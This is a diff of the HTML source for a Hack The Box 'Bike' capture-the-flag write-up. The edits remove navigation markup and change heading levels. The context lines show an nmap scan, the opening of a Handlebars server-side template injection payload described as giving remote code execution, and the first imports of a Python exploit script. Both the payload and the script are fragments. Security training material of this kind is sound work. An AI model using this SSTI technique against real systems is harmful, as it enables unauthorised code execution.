@@ -637,18 +637,6 @@
         
       
       
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    HTB Bike - SSTI Exploit Write-up
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -659,124 +647,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#overview" class="md-nav__link">
-    <span class="md-ellipsis">
-      Overview
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enumeration
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Enumeration">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#nmap-scan" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔍 Nmap Scan
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#identifying-ssti" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔍 Identifying SSTI
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exploitation
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploitation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#exploit-payload" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔗 Exploit Payload
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#automating-the-exploit" class="md-nav__link">
-    <span class="md-ellipsis">
-      🚀 Automating the Exploit
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="🚀 Automating the Exploit">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#proof-of-concept-poc-exploit-script" class="md-nav__link">
-    <span class="md-ellipsis">
-      📜 Proof of Concept (PoC) Exploit Script
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      📜 Conclusion
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
       
     </li>
   
@@ -794,7 +664,7 @@
         
   
   <span class="md-ellipsis">
-    HTB Synced Exploit Documentation
+    HTB Synced - Write-up
     
   </span>
   
@@ -890,11 +760,11 @@
 
 <h1 id="htb-bike-ssti-exploit-write-up">HTB Bike - SSTI Exploit Write-up</h1>
 <p><img alt="Bike Logo" src="https://infosec-db.github.io/CyberDepot/assets/htb-bike.png" /></p>
-<h2 id="overview">Overview</h2>
+<h1 id="overview">Overview</h1>
 <p><strong>HTB Bike</strong> is a <em>Hack The Box</em> machine that involves exploiting a <strong>Server-Side Template Injection (SSTI)</strong> vulnerability in a <strong>Node.js Handlebars template engine</strong>. This write-up provides a detailed walkthrough of the exploitation process and includes a fully automated <strong>SQLmap-styled</strong> exploit script.</p>
 <hr />
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="nmap-scan"><strong>🔍 Nmap Scan</strong></h3>
+<h1 id="enumeration">Enumeration</h1>
+<h1 id="nmap-scan"><strong>🔍 Nmap Scan</strong></h1>
 <p>We start by scanning the target with <strong>Nmap</strong>:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.6.196
 </code></pre></div>
@@ -910,8 +780,8 @@
 </code></pre></div>
 <p>If the response contains <code>49</code>, <strong>the site is vulnerable!</strong> ✅</p>
 <hr />
-<h2 id="exploitation">Exploitation</h2>
-<h3 id="exploit-payload"><strong>🔗 Exploit Payload</strong></h3>
+<h1 id="exploitation">Exploitation</h1>
+<h1 id="exploit-payload"><strong>🔗 Exploit Payload</strong></h1>
 <p>Using <strong>Handlebars SSTI</strong>, we craft a payload that executes system commands:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">{{</span><span class="m m-Attribute">#with</span> <span class="s2">&quot;s&quot;</span> <span class="nv">as</span> <span class="err">|</span><span class="nv">string</span><span class="err">|</span><span class="cp">}}</span>
 <a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="cp">{{</span><span class="m m-Attribute">#with</span> <span class="s2">&quot;e&quot;</span><span class="cp">}}</span>
@@ -935,12 +805,12 @@
 </code></pre></div>
 <p>This <strong>bypasses sandboxing</strong> and allows <strong>Remote Code Execution (RCE)</strong>!</p>
 <hr />
-<h2 id="automating-the-exploit">🚀 Automating the Exploit</h2>
+<h1 id="automating-the-exploit">🚀 Automating the Exploit</h1>
 <p>We use a <strong>fully automated Python script</strong> with:
 ✅ <strong>SQLmap-style output</strong><br />
 ✅ <strong>Fancy ASCII banner</strong><br />
 ✅ <strong>JSON debugging for failed extractions</strong>  </p>
-<h3 id="proof-of-concept-poc-exploit-script"><strong>📜 Proof of Concept (PoC) Exploit Script</strong></h3>
+<h1 id="proof-of-concept-poc-exploit-script"><strong>📜 Proof of Concept (PoC) Exploit Script</strong></h1>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
 <a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
 <a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
@@ -1069,7 +939,7 @@
 <a id="__codelineno-4-126" name="__codelineno-4-126" href="#__codelineno-4-126"></a>    <span class="n">main</span><span class="p">()</span>
 </code></pre></div>
 <hr />
-<h2 id="conclusion">📜 Conclusion</h2>
+<h1 id="conclusion">📜 Conclusion</h1>
 <p>This challenge demonstrates <strong>how dangerous SSTI can be</strong>, especially in <strong>Node.js-based applications</strong>. The exploit works by <strong>breaking out of the Handlebars sandbox</strong> and gaining <strong>full system control</strong>.</p>
 <hr />
 <p>🛠️ <strong>Credits:</strong><br />
